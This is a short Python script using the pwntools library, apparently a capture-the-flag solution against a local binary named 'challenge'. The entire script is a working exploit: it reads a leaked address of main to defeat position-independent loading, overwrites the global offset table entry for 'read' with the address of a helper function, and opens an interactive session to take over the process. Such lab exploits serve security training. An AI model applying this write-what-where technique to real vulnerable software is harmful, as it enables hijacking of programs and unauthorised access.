from pwn import *

context.binary = './challenge'
p = process(context.binary.path)
main = p.unpack()
elf = context.binary
elf.address = main - elf.symbols['main']

where = (elf.got['read'])
what = (elf.symbols['oh_look_useful'])

p.pack(where)
p.pack(what)
p.interactive()
